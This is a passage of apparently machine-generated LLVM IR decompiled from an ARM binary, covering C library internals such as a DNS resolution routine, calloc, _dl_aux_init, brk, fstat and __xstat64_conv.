  %v0_177f8 = load i32, i32* @sb, align 4
  store i32 10, i32* %r0.global-to-local, align 4
  %v0_17800 = load i32, i32* @r8, align 4
  store i32 %v0_17800, i32* %r2.global-to-local, align 4
  %v3_17804 = inttoptr i32 %v0_177f8 to i8*
  %v4_17804 = call i32 @inet_pton(i32 10, i8* %v3_17804, i32 %v0_17800)
  store i32 %v4_17804, i32* %r0.global-to-local, align 4
  %v1_17808 = load i32, i32* @r4, align 4
  %v9_17808 = icmp eq i32 %v4_17804, %v1_17808
  br i1 %v9_17808, label %dec_label_pc_17840, label %dec_label_pc_17810

dec_label_pc_17810:                               ; preds = %dec_label_pc_177c8
  store i32 %v1_177d0, i32* @ip, align 4
  %v0_17818 = load i32, i32* @r6, align 4
  store i32 %v0_17818, i32* %v2_17714, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v1_17820 = load i32, i32* @r6, align 4
  %v2_17820 = add i32 %v1_17820, 8
  %v3_17820 = inttoptr i32 %v2_17820 to i32*
  store i32 10, i32* %v3_17820, align 4
  %v0_17824 = load i32, i32* @r4, align 4
  store i32 %v0_17824, i32* %r0.global-to-local, align 4
  %v0_17828 = load i32, i32* %r3.global-to-local, align 4
  %v1_17828 = add i32 %v0_17828, 6
  store i32 %v1_17828, i32* %r3.global-to-local, align 4
  %v1_1782c = load i32, i32* @r6, align 4
  %v2_1782c = add i32 %v1_1782c, 12
  %v3_1782c = inttoptr i32 %v2_1782c to i32*
  store i32 %v1_17828, i32* %v3_1782c, align 4
  %v0_17830 = load i32, i32* @r5, align 4
  %v1_17830 = load i32, i32* @r6, align 4
  %v2_17830 = inttoptr i32 %v1_17830 to i32*
  store i32 %v0_17830, i32* %v2_17830, align 4
  %v0_17834 = load i32, i32* @ip, align 4
  %v1_17834 = load i32, i32* @r6, align 4
  %v2_17834 = add i32 %v1_17834, 16
  %v3_17834 = inttoptr i32 %v2_17834 to i32*
  store i32 %v0_17834, i32* %v3_17834, align 4
  %v0_17838 = load i32, i32* @r4, align 4
  %v1_17838 = load i32, i32* @fp, align 4
  %v2_17838 = inttoptr i32 %v1_17838 to i32*
  store i32 %v0_17838, i32* %v2_17838, align 4
  br label %dec_label_pc_17954

dec_label_pc_17840:                               ; preds = %dec_label_pc_177c8
  %v0_17840 = load i32, i32* @r7, align 4
  %v2_17840 = icmp eq i32 %v0_17840, 0
  br i1 %v2_17840, label %dec_label_pc_17848, label %dec_label_pc_17940

dec_label_pc_17848:                               ; preds = %dec_label_pc_17840
  %v2_17848 = ptrtoint i32* %stack_var_-84 to i32
  store i32 %v2_17848, i32* @r4, align 4
  store i32 %v2_17848, i32* %r0.global-to-local, align 4
  store i32 40, i32* @r2, align 4
  %v2_17858 = bitcast i32* %stack_var_-84 to i8*
  %v3_17858 = call i32 @__GI_memset(i8* %v2_17858, i32 0)
  store i32 %v3_17858, i32* %r0.global-to-local, align 4
  %v2_17860 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_17860, i32* @sb, align 4
  %v7_178a0 = icmp eq i32 %tmp9, 5
  br label %dec_label_pc_17864

dec_label_pc_17864:                               ; preds = %dec_label_pc_178b8, %dec_label_pc_17848
  store i32 %v2_17860, i32* %r2.global-to-local, align 4
  store i32 %v2_17848, i32* %r3.global-to-local, align 4
  %v0_17870 = load i32, i32* @r5, align 4
  store i32 %v0_17870, i32* %r0.global-to-local, align 4
  %v4_17874 = inttoptr i32 %v0_17870 to i8*
  %v5_17874 = call i32 @__dns_lookup(i8* %v4_17874, i32 28, i32 %v2_17860, i32 %v2_17848)
  store i32 %v5_17874, i32* @r4, align 4
  %v1_17878 = icmp slt i32 %v5_17874, 0
  %v0_1787c = load i32, i32* @sl, align 4
  store i32 %v0_1787c, i32* %r2.global-to-local, align 4
  %v0_17880 = load i32, i32* @r7, align 4
  %v1_17880 = add i32 %v0_17880, 1
  store i32 %v1_17880, i32* @r7, align 4
  %v0_17884 = load i32, i32* @r5, align 4
  store i32 %v0_17884, i32* %r0.global-to-local, align 4
  br i1 %v1_17878, label %dec_label_pc_17940, label %dec_label_pc_1788c

dec_label_pc_1788c:                               ; preds = %dec_label_pc_17864
  %v3_1788c = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_1788c, i32* @r1, align 4
  %v3_17890 = call i32 @strncpy(i32 %v0_17884, i32 %v3_1788c, i32 %v0_1787c)
  %v3_17894 = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_17894, i32* @r0, align 4
  %v0_17898 = call i32 @free()
  store i32 %v0_17898, i32* %r0.global-to-local, align 4
  %v0_178a4 = load i32, i32* @r4, align 4
  store i32 %v0_178a4, i32* %r2.global-to-local, align 4
  %v0_178a8 = load i32, i32* @r5, align 4
  store i32 %v0_178a8, i32* @r3, align 4
  br i1 %v7_178a0, label %dec_label_pc_178b0, label %dec_label_pc_178e8

dec_label_pc_178b0:                               ; preds = %dec_label_pc_1788c
  %v0_178b0 = load i32, i32* @r7, align 4
  %v8_178b4 = icmp sgt i32 %v0_178b0, 5
  br i1 %v8_178b4, label %dec_label_pc_178dc, label %dec_label_pc_178b8

dec_label_pc_178b8:                               ; preds = %dec_label_pc_178b0
  store i32 %tmp8, i32* @r1, align 4
  %v3_178bc = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_178bc, i32* %r0.global-to-local, align 4
  %v0_178c0 = load i32, i32* @sl, align 4
  %v5_178c4 = call i32 @__decode_dotted(i32 %v3_178bc, i32 %tmp8, i32 %v0_178a4, i32 %v0_178a8, i32 %v0_178c0)
  store i32 %v5_178c4, i32* @r4, align 4
  %v3_178cc = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_178cc, i32* @r0, align 4
  %v0_178d0 = call i32 @free()
  store i32 %v0_178d0, i32* %r0.global-to-local, align 4
  %v0_178d4 = load i32, i32* @r4, align 4
  %v1_178d4 = icmp slt i32 %v0_178d4, 0
  br i1 %v1_178d4, label %dec_label_pc_178dc, label %dec_label_pc_17864

dec_label_pc_178dc:                               ; preds = %dec_label_pc_178b8, %dec_label_pc_178b0
  store i32 -1, i32* %r0.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17948

dec_label_pc_178e8:                               ; preds = %dec_label_pc_1788c
  %v7_178e8 = icmp eq i32 %tmp9, 28
  br i1 %v7_178e8, label %dec_label_pc_178f0, label %dec_label_pc_17938

dec_label_pc_178f0:                               ; preds = %dec_label_pc_178e8
  store i32 16, i32* @r2, align 4
  %v0_178f8 = load i32, i32* @r8, align 4
  store i32 %v0_178f8, i32* @r0, align 4
  %v0_178fc = call i32 @memcpy()
  store i32 10, i32* %r3.global-to-local, align 4
  store i32 %v1_177d0, i32* %r2.global-to-local, align 4
  %v1_17908 = load i32, i32* @r6, align 4
  %v2_17908 = add i32 %v1_17908, 8
  %v3_17908 = inttoptr i32 %v2_17908 to i32*
  store i32 10, i32* %v3_17908, align 4
  %v0_1790c = load i32, i32* %r3.global-to-local, align 4
  %v1_1790c = add i32 %v0_1790c, 6
  store i32 %v1_1790c, i32* %r3.global-to-local, align 4
  %v1_17910 = load i32, i32* @r6, align 4
  %v2_17910 = add i32 %v1_17910, 12
  %v3_17910 = inttoptr i32 %v2_17910 to i32*
  store i32 %v1_1790c, i32* %v3_17910, align 4
  %v3_17914 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_17914, i32* @r0, align 4
  %v0_17918 = load i32, i32* @r5, align 4
  %v1_17918 = load i32, i32* @r6, align 4
  %v2_17918 = inttoptr i32 %v1_17918 to i32*
  store i32 %v0_17918, i32* %v2_17918, align 4
  %v0_1791c = load i32, i32* %r2.global-to-local, align 4
  %v1_1791c = load i32, i32* @r6, align 4
  %v2_1791c = add i32 %v1_1791c, 16
  %v3_1791c = inttoptr i32 %v2_1791c to i32*
  store i32 %v0_1791c, i32* %v3_1791c, align 4
  %v0_17920 = call i32 @free()
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %arg6, i32* @ip, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_17930 = load i32, i32* @r6, align 4
  store i32 %v0_17930, i32* %v2_17714, align 4
  %v0_17948.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17948

dec_label_pc_17938:                               ; preds = %dec_label_pc_178e8
  %v3_17938 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_17938, i32* @r0, align 4
  %v0_1793c = call i32 @free()
  store i32 %v0_1793c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17940

dec_label_pc_17940:                               ; preds = %dec_label_pc_17864, %dec_label_pc_17840, %dec_label_pc_17938
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17948

dec_label_pc_17948:                               ; preds = %dec_label_pc_178f0, %dec_label_pc_178dc, %dec_label_pc_17940
  %v0_17948 = phi i32 [ %v0_17948.pre, %dec_label_pc_178f0 ], [ 3, %dec_label_pc_178dc ], [ 1, %dec_label_pc_17940 ]
  %v1_17948 = load i32, i32* @fp, align 4
  %v2_17948 = inttoptr i32 %v1_17948 to i32*
  store i32 %v0_17948, i32* %v2_17948, align 4
  br label %dec_label_pc_17954

dec_label_pc_17950:                               ; preds = %dec_label_pc_17708, %dec_label_pc_1771c
  store i32 22, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17954

dec_label_pc_17954:                               ; preds = %bb, %bb30, %dec_label_pc_17790, %dec_label_pc_17774, %dec_label_pc_17948, %dec_label_pc_17810, %dec_label_pc_176e8, %dec_label_pc_17950
  store i32 %v9_176c0, i32* @r6, align 4
  store i32 %v12_176c0, i32* @r7, align 4
  store i32 %v15_176c0, i32* @r8, align 4
  store i32 %v18_176c0, i32* @sb, align 4
  store i32 %v21_176c0, i32* @sl, align 4
  %v1_1795c = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_1795c

; uselistorder directives
  uselistorder i32 %v2_17848, { 1, 0, 2, 3 }
  uselistorder i32 %v1_177d0, { 2, 1, 0, 3 }
  uselistorder i32 %v1_177a4, { 1, 0 }
  uselistorder i32* %stack_var_-84, { 1, 2, 0, 3 }
  uselistorder i32 %tmp8, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32* %r0.global-to-local, { 22, 0, 1, 3, 2, 4, 5, 6, 7, 8, 9, 12, 10, 11, 14, 13, 15, 17, 16, 18, 20, 19, 21, 23 }
  uselistorder i32 (i32, i32, i32)* @strncpy, { 1, 0, 2 }
  uselistorder i32 -24, { 1, 0 }
  uselistorder i32 %arg6, { 4, 3, 0, 2, 1 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_17954, { 7, 4, 5, 1, 2, 3, 0, 6 }
  uselistorder label %dec_label_pc_17950, { 1, 0 }
  uselistorder label %dec_label_pc_17948, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17940, { 2, 0, 1 }
  uselistorder label %dec_label_pc_177a0, { 2, 1, 0 }
}

define i32 @calloc(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %v3_17960 = load i32, i32* @r4, align 4
  %v6_17960 = load i32, i32* @r5, align 4
  %v9_17960 = load i32, i32* @r6, align 4
  %v12_17960 = load i32, i32* @lr, align 4
  %v2_17968 = icmp eq i32 %arg1, 0
  store i32 ptrtoint (i32* @global_var_26934.581 to i32), i32* @r5, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v2_17978 = mul i32 %arg2, %arg1
  store i32 %v2_17978, i32* @r6, align 4
  br i1 %v2_17968, label %dec_label_pc_179a8, label %dec_label_pc_17980

dec_label_pc_17980:                               ; preds = %entry
  %v2_17988 = udiv i32 %v2_17978, %arg1
  %v9_1798c = icmp eq i32 %v2_17988, %arg2
  br i1 %v9_1798c, label %dec_label_pc_179a8, label %dec_label_pc_17994

dec_label_pc_17994:                               ; preds = %dec_label_pc_17980
  %v0_17994 = call i32 @__GI___errno_location()
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_179a0 = inttoptr i32 %v0_17994 to i32*
  store i32 12, i32* %v2_179a0, align 4
  br label %dec_label_pc_17a6c

dec_label_pc_179a8:                               ; preds = %dec_label_pc_17980, %entry
  %v4_179ac = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 72) to i32*), align 4
  store i32 %v4_179ac, i32* @r4, align 4
  %v4_179c4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 76) to i32*), align 4
  store i32 %v4_179c4, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_179c4)
  %v0_179d8 = load i32, i32* @r5, align 4
  %v2_179d8 = add i32 %v0_179d8, 16
  %v3_179d8 = inttoptr i32 %v2_179d8 to i32*
  %v4_179d8 = load i32, i32* %v3_179d8, align 4
  store i32 %v4_179d8, i32* %ip.global-to-local, align 4
  store i32 96740, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_179d8)
  %v0_179e4 = load i32, i32* @r6, align 4
  %v1_179e8 = call i32 @malloc(i32 %v0_179e4)
  store i32 %v1_179e8, i32* %r4.global-to-local, align 4
  %v2_179ec = icmp eq i32 %v1_179e8, 0
  br i1 %v2_179ec, label %.thread, label %dec_label_pc_179f4

dec_label_pc_179f4:                               ; preds = %dec_label_pc_179a8
  %v1_179f4 = add i32 %v1_179e8, -4
  %v2_179f4 = inttoptr i32 %v1_179f4 to i32*
  %v3_179f4 = load i32, i32* %v2_179f4, align 4
  %v1_179f8 = and i32 %v3_179f4, 2
  %v2_179f8 = icmp eq i32 %v1_179f8, 0
  br i1 %v2_179f8, label %dec_label_pc_17a00, label %.thread

dec_label_pc_17a00:                               ; preds = %dec_label_pc_179f4
  %v1_17a006 = add i32 %v3_179f4, -4
  %v1_17a04 = and i32 %v1_17a006, -4
  store i32 %v1_17a04, i32* @r2, align 4
  %v3_17a08 = udiv i32 %v1_17a04, 4
  store i32 %v3_17a08, i32* %ip.global-to-local, align 4
  %tmp = icmp eq i32 %v1_17a04, 36
  %v2_17a10 = icmp ult i32 %v1_17a04, 33
  %v3_17a10 = or i1 %tmp, %v2_17a10
  br i1 %v3_17a10, label %dec_label_pc_17a1c, label %dec_label_pc_17a14

dec_label_pc_17a14:                               ; preds = %dec_label_pc_17a00
  %v2_17a14 = inttoptr i32 %v1_179e8 to i8*
  %v3_17a14 = call i32 @__GI_memset(i8* %v2_17a14, i32 0)
  br label %.thread

dec_label_pc_17a1c:                               ; preds = %dec_label_pc_17a00
  %tmp7 = icmp eq i32 %v1_17a04, 16
  %v2_17a20 = inttoptr i32 %v1_179e8 to i32*
  store i32 0, i32* %v2_17a20, align 4
  %v1_17a24 = load i32, i32* %r4.global-to-local, align 4
  %v2_17a24 = add i32 %v1_17a24, 4
  %v3_17a24 = inttoptr i32 %v2_17a24 to i32*
  store i32 0, i32* %v3_17a24, align 4
  %v1_17a28 = load i32, i32* %r4.global-to-local, align 4
  %v2_17a28 = add i32 %v1_17a28, 8
  %v3_17a28 = inttoptr i32 %v2_17a28 to i32*
  store i32 0, i32* %v3_17a28, align 4
  %v2_17a2c = icmp ult i32 %v1_17a04, 13
  %v3_17a2c = or i1 %tmp7, %v2_17a2c
  br i1 %v3_17a2c, label %.thread, label %dec_label_pc_17a30

dec_label_pc_17a30:                               ; preds = %dec_label_pc_17a1c
  %v0_17a30 = load i32, i32* %ip.global-to-local, align 4
  %v1_17a34 = load i32, i32* %r4.global-to-local, align 4
  %v2_17a34 = add i32 %v1_17a34, 12
  %v3_17a34 = inttoptr i32 %v2_17a34 to i32*
  store i32 0, i32* %v3_17a34, align 4
  %v1_17a38 = load i32, i32* %r4.global-to-local, align 4
  %v2_17a38 = add i32 %v1_17a38, 16
  %v3_17a38 = inttoptr i32 %v2_17a38 to i32*
  store i32 0, i32* %v3_17a38, align 4
  %tmp8 = icmp ult i32 %v0_17a30, 7
  br i1 %tmp8, label %.thread, label %dec_label_pc_17a40

dec_label_pc_17a40:                               ; preds = %dec_label_pc_17a30
  %v0_17a40 = load i32, i32* %ip.global-to-local, align 4
  %v7_17a40 = icmp eq i32 %v0_17a40, 9
  %v1_17a44 = load i32, i32* %r4.global-to-local, align 4
  %v2_17a44 = add i32 %v1_17a44, 20
  %v3_17a44 = inttoptr i32 %v2_17a44 to i32*
  store i32 0, i32* %v3_17a44, align 4
  %v1_17a48 = load i32, i32* %r4.global-to-local, align 4
  %v2_17a48 = add i32 %v1_17a48, 24
  %v3_17a48 = inttoptr i32 %v2_17a48 to i32*
  store i32 0, i32* %v3_17a48, align 4
  br i1 %v7_17a40, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_17a40
  %v2_17a4c = load i32, i32* %r4.global-to-local, align 4
  %v3_17a4c = add i32 %v2_17a4c, 32
  %v4_17a4c = inttoptr i32 %v3_17a4c to i32*
  store i32 0, i32* %v4_17a4c, align 4
  %v2_17a50 = load i32, i32* %r4.global-to-local, align 4
  %v3_17a50 = add i32 %v2_17a50, 28
  %v4_17a50 = inttoptr i32 %v3_17a50 to i32*
  store i32 0, i32* %v4_17a50, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_17a40, %dec_label_pc_179f4, %dec_label_pc_17a30, %dec_label_pc_17a1c, %dec_label_pc_179a8, %dec_label_pc_17a14, %bb
  %v0_17a60 = load i32, i32* @r5, align 4
  %v2_17a60 = add i32 %v0_17a60, 24
  %v3_17a60 = inttoptr i32 %v2_17a60 to i32*
  %v4_17a60 = load i32, i32* %v3_17a60, align 4
  store i32 %v4_17a60, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_17a60)
  br label %dec_label_pc_17a6c

dec_label_pc_17a6c:                               ; preds = %dec_label_pc_17994, %.thread
  %v0_17a6c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v3_17960, i32* @r4, align 4
  store i32 %v6_17960, i32* @r5, align 4
  store i32 %v9_17960, i32* @r6, align 4
  store i32 %v12_17960, i32* @lr, align 4
  ret i32 %v0_17a6c

; uselistorder directives
  uselistorder i32 %v1_17a04, { 0, 5, 1, 4, 3, 2 }
  uselistorder i32 %v1_179e8, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r4.global-to-local, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 11 }
  uselistorder i32 13, { 0, 3, 4, 6, 5, 1, 7, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_17a6c, { 1, 0 }
  uselistorder label %.thread, { 6, 0, 2, 3, 5, 1, 4 }
}

define i32 @function_17a80(i32 %arg1) local_unnamed_addr {
dec_label_pc_17a80:
  %v0_17a80 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17a80, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_17a80
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_17a80, %bb
  %v10_17a90 = phi i32 [ %arg1, %dec_label_pc_17a80 ], [ 0, %bb ]
  ret i32 %v10_17a90

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @_dl_aux_init(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_26934.581 to i32), i32* %r2.global-to-local, align 4
  %v4_17aa0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 104) to i32*), align 4
  %v4_17aa8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 68) to i32*), align 4
  store i32 %v4_17aa8, i32* %r1.global-to-local, align 4
  %v1_17aac = add i32 %arg1, 44
  %v2_17aac = inttoptr i32 %v1_17aac to i32*
  %v3_17aac = load i32, i32* %v2_17aac, align 4
  %v1_17ab0 = add i32 %arg1, 28
  %v2_17ab0 = inttoptr i32 %v1_17ab0 to i32*
  %v3_17ab0 = load i32, i32* %v2_17ab0, align 4
  store i32 %v3_17ab0, i32* %r2.global-to-local, align 4
  %v2_17ab4 = inttoptr i32 %v4_17aa0 to i32*
  store i32 %v3_17aac, i32* %v2_17ab4, align 4
  %v0_17ab8 = load i32, i32* %r2.global-to-local, align 4
  %v1_17ab8 = load i32, i32* %r1.global-to-local, align 4
  %v2_17ab8 = inttoptr i32 %v1_17ab8 to i32*
  store i32 %v0_17ab8, i32* %v2_17ab8, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %arg1, { 0, 2, 1 }
}

define i32 @function_17ac4(i32 %arg1) local_unnamed_addr {
dec_label_pc_17ac4:
  %v0_17ac4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17ac4, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_17ac4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_17ac4, %bb
  %v4_17ac8 = phi i32 [ %arg1, %dec_label_pc_17ac4 ], [ 0, %bb ]
  ret i32 %v4_17ac8

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__GI_brk(i32 %arg1) local_unnamed_addr {
dec_label_pc_17b08:
  store i32 %arg1, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 27612) to i32*), align 4
  ret i32 0
}

define i32 @__aeabi_unwind_cpp_pr0() local_unnamed_addr {
entry:
  %v1_17b18 = load i32, i32* @r0, align 4
  ret i32 %v1_17b18
}

define i32 @__aeabi_unwind_cpp_pr1() local_unnamed_addr {
entry:
  %v1_17b1c = load i32, i32* @r0, align 4
  ret i32 %v1_17b1c
}

define i32 @__aeabi_unwind_cpp_pr2() local_unnamed_addr {
entry:
  %v1_17b20 = load i32, i32* @r0, align 4
  ret i32 %v1_17b20
}

define i32 @fstat() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %v0_17b2c = load i32, i32* @r1, align 4
  store i32 %v0_17b2c, i32* @r3, align 4
  %v0_17b3c = load i32, i32* @r0, align 4
  store i32 %v0_17b3c, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_17b3c, -4095
  br i1 %tmp, label %dec_label_pc_17b5c, label %dec_label_pc_17b48

dec_label_pc_17b48:                               ; preds = %entry
  %v0_17b48 = call i32 @__GI___errno_location()
  %v0_17b4c = load i32, i32* %r7.global-to-local, align 4
  %v1_17b4c = sub i32 0, %v0_17b4c
  store i32 %v1_17b4c, i32* @r3, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_17b54 = inttoptr i32 %v0_17b48 to i32*
  store i32 %v1_17b4c, i32* %v2_17b54, align 4
  br label %dec_label_pc_17b6c

dec_label_pc_17b5c:                               ; preds = %entry
  %v2_17b5c = icmp eq i32 %v0_17b3c, 0
  br i1 %v2_17b5c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_17b5c
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_17b5c, %bb
  call void @__pseudo_cond_branch(i1 %v2_17b5c, i32 ptrtoint (i32* @global_var_17cf4.917 to i32))
  br label %dec_label_pc_17b6c

dec_label_pc_17b6c:                               ; preds = %dec_label_pc_17b48, %.thread
  %v0_17b6c = load i32, i32* %r7.global-to-local, align 4
  ret i32 %v0_17b6c

; uselistorder directives
  uselistorder i32 %v0_17b3c, { 1, 0, 2 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_17b6c, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__xstat64_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_17b7c = load i32, i32* @r4, align 4
  store i32 %v3_17b7c, i32* %stack_var_-24, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 104, i32* @r2, align 4
  %v2_17b94 = inttoptr i32 %arg2 to i8*
  %v3_17b94 = call i32 @__GI_memset(i8* %v2_17b94, i32 0)
  %v2_17b98 = load i32, i32* %arg1, align 4
  store i32 %v2_17b98, i32* %r3.global-to-local, align 4
  %v3_17b98 = add i32 %tmp, 4
  %v4_17b98 = inttoptr i32 %v3_17b98 to i32*
  %v5_17b98 = load i32, i32* %v4_17b98, align 4
  store i32 %v5_17b98, i32* %r4.global-to-local, align 4
  %v0_17b9c = load i32, i32* %r5.global-to-local, align 4
  %v1_17b9c = inttoptr i32 %v0_17b9c to i32*
  store i32 %v2_17b98, i32* %v1_17b9c, align 4
  %v3_17b9c = add i32 %v0_17b9c, 4
  %v4_17b9c = inttoptr i32 %v3_17b9c to i32*
  %v5_17b9c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_17b9c, i32* %v4_17b9c, align 4
  %v0_17ba0 = load i32, i32* %r6.global-to-local, align 4
  %v1_17ba0 = add i32 %v0_17ba0, 12
  %v2_17ba0 = inttoptr i32 %v1_17ba0 to i32*
  %v3_17ba0 = load i32, i32* %v2_17ba0, align 4
  %v1_17ba4 = load i32, i32* %r5.global-to-local, align 4
  %v2_17ba4 = add i32 %v1_17ba4, 12
  %v3_17ba4 = inttoptr i32 %v2_17ba4 to i32*
  store i32 %v3_17ba0, i32* %v3_17ba4, align 4
  %v0_17ba8 = load i32, i32* %r6.global-to-local, align 4
  %v1_17ba8 = add i32 %v0_17ba8, 96
  store i32 %v1_17ba8, i32* %r3.global-to-local, align 4
  %v1_17bac = inttoptr i32 %v1_17ba8 to i32*
  %v2_17bac = load i32, i32* %v1_17bac, align 4
  store i32 %v2_17bac, i32* %r3.global-to-local, align 4
  %v3_17bac = add i32 %v0_17ba8, 100
  %v4_17bac = inttoptr i32 %v3_17bac to i32*
  %v5_17bac = load i32, i32* %v4_17bac, align 4
  store i32 %v5_17bac, i32* %r4.global-to-local, align 4
  %v1_17bb0 = add i32 %v0_17ba8, 56
  %v2_17bb0 = inttoptr i32 %v1_17bb0 to i32*
  %v3_17bb0 = load i32, i32* %v2_17bb0, align 4
  store i32 %v3_17bb0, i32* %r2.global-to-local, align 4
  %v1_17bb4 = load i32, i32* %r5.global-to-local, align 4
  %v2_17bb4 = add i32 %v1_17bb4, 96
  %v3_17bb4 = inttoptr i32 %v2_17bb4 to i32*
  store i32 %v2_17bac, i32* %v3_17bb4, align 4
  %v0_17bb8 = load i32, i32* %r4.global-to-local, align 4
  %v1_17bb8 = load i32, i32* %r5.global-to-local, align 4
  %v2_17bb8 = add i32 %v1_17bb8, 100
  %v3_17bb8 = inttoptr i32 %v2_17bb8 to i32*
  store i32 %v0_17bb8, i32* %v3_17bb8, align 4
  %v0_17bbc = load i32, i32* %r6.global-to-local, align 4
  %v1_17bbc = add i32 %v0_17bbc, 24
  store i32 %v1_17bbc, i32* %ip.global-to-local, align 4
  %v1_17bc0 = inttoptr i32 %v1_17bbc to i32*
  %v2_17bc0 = load i32, i32* %v1_17bc0, align 4
  store i32 %v2_17bc0, i32* %ip.global-to-local, align 4
  %v3_17bc0 = add i32 %v0_17bbc, 28
  %v4_17bc0 = inttoptr i32 %v3_17bc0 to i32*
  %v5_17bc0 = load i32, i32* %v4_17bc0, align 4
  store i32 %v5_17bc0, i32* %lr.global-to-local, align 4
  %v0_17bc4 = load i32, i32* %r2.global-to-local, align 4
  %v1_17bc4 = load i32, i32* %r5.global-to-local, align 4
  %v2_17bc4 = add i32 %v1_17bc4, 56
  %v3_17bc4 = inttoptr i32 %v2_17bc4 to i32*
  store i32 %v0_17bc4, i32* %v3_17bc4, align 4
  %v0_17bc8 = load i32, i32* %r6.global-to-local, align 4
  %v1_17bc8 = add i32 %v0_17bc8, 72
  store i32 %v1_17bc8, i32* %r3.global-to-local, align 4
  %v1_17bcc = add i32 %v0_17bc8, 32
  store i32 %v1_17bcc, i32* %r7.global-to-local, align 4
  %v1_17bd0 = inttoptr i32 %v1_17bcc to i32*
  %v2_17bd0 = load i32, i32* %v1_17bd0, align 4
  store i32 %v2_17bd0, i32* %r7.global-to-local, align 4
  %v3_17bd0 = add i32 %v0_17bc8, 36
  %v4_17bd0 = inttoptr i32 %v3_17bd0 to i32*
  %v5_17bd0 = load i32, i32* %v4_17bd0, align 4
  store i32 %v5_17bd0, i32* %r8.global-to-local, align 4
  %v1_17bd4 = inttoptr i32 %v1_17bc8 to i32*
  %v2_17bd4 = load i32, i32* %v1_17bd4, align 4
  %v3_17bd4 = add i32 %v0_17bc8, 76
  %v4_17bd4 = inttoptr i32 %v3_17bd4 to i32*
  %v5_17bd4 = load i32, i32* %v4_17bd4, align 4
  store i32 %v5_17bd4, i32* %r1.global-to-local, align 4
  %v0_17bd8 = load i32, i32* %r5.global-to-local, align 4
  %v1_17bd8 = add i32 %v0_17bd8, 72
  %v1_17bdc = inttoptr i32 %v1_17bd8 to i32*
